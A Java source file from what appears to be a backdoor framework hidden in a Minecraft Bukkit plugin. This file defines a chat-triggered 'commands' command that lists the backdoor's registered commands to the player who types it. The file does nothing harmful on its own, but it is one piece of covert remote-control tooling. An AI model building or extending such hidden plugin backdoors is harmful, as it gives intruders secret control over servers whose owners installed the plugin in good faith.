package me.tsb.backdoor.commands.help;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "commands",
        usage = {"<prefix> <command> <command"},
        description = "Shows a list of commands",
        aliases = {"commands", "cmds"})
public class CommandsCommand extends Command {
    private Main main;

    public CommandsCommand(Main main) {
        super(main);
        this.main = main;
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        StringBuilder sb = new StringBuilder();
        sb.append("commands: \n");

        for (Command c : main.getCommandManager().getCommands()) {
            sb.append(c.getDisplayName());
            sb.append("\n");
        }
        sb.delete(sb.length() - 2, sb.length());

        event.getPlayer().sendMessage(sb.toString());
    }
}
